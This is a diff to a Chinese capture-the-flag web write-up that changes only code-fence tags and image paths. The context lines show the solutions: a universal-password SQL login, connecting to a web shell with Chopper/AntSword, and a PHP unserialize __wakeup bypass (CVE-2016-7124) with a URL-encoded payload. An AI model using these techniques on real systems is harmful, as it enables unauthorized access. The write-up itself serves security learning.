@@ -15,7 +15,7 @@ categories:
 
 查看源码,发现提示
 
-```
+```html
                 <!--
         $cat=$_GET['cat'];
         echo $cat;
@@ -29,19 +29,19 @@ payload=`?cat=dog`
 
 <!--more-->
 
-![](../pic/9.png)
+![](/pic/9.png)
 
 ### EasySQL
 
 万能密码直接获取结果
 
-![](../pic/10.png)
+![](/pic/10.png)
 
 ### Knife
 
 使用菜刀或者蚁剑连接 密码Syc
 
-![](../pic/11.png)
+![](/pic/11.png)
 
 flag在根目录下
 
@@ -49,7 +49,7 @@ flag在根目录下
 
 查看源码
 
-```
+```html
 <!DOCTYPE html>
 
 <html>
@@ -84,7 +84,7 @@ flag在根目录下
 
 点击其中的链接
 
-```
+```html
 <!DOCTYPE html>
 
 <html>
@@ -122,7 +122,7 @@ flag在根目录下
 
 再次点击链接
 
-```
+```html
 <!DOCTYPE html>
 
 <html>
@@ -154,11 +154,11 @@ flag在根目录下
 
 一直点，查看记录，发现有一个
 
-![](../pic/12.png)
+![](/pic/12.png)
 
 打开发现源码
 
-```
+```php+HTML
 <html>
     <title>secret</title>
     <meta charset="UTF-8">
@@ -180,7 +180,7 @@ flag在根目录下
 
 将得到的base64解码
 
-```
+```php+HTML
 <!DOCTYPE html>
 
 <html>
@@ -212,7 +212,7 @@ flag在根目录下
 
 class.php
 
-```
+```php
 <?php
 include 'flag.php';
 
@@ -263,7 +263,7 @@ var_dump(serialize($a));
 
 index.php中关键代码
 
-```
+```php
  <?php
     include 'class.php';
     $select = $_GET['select'];
@@ -273,7 +273,7 @@ index.php中关键代码
 
 flag.php
 
-```
+```php
 <?php
 $flag = 'Syc{dog_dog_dog_dog}';
 ?>
@@ -287,7 +287,7 @@ $flag = 'Syc{dog_dog_dog_dog}';
 
 `CVE-2016-7124`提到`unserialize()` 绕过`__wakeup()`的方法，在序列化后对象数量声明中大于原本的的数量即可绕过。
 
-```
+```php
 <?php
 class Name{
     private $username = 'admin';
@@ -304,5 +304,5 @@ var_dump(serialize($a));//O:4:"Name":2:{s:14:"�Name�username";s:5:"admin";s:
 
 `payload：O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D`
 
-![](../pic/13.png)
+![](/pic/13.png)
 
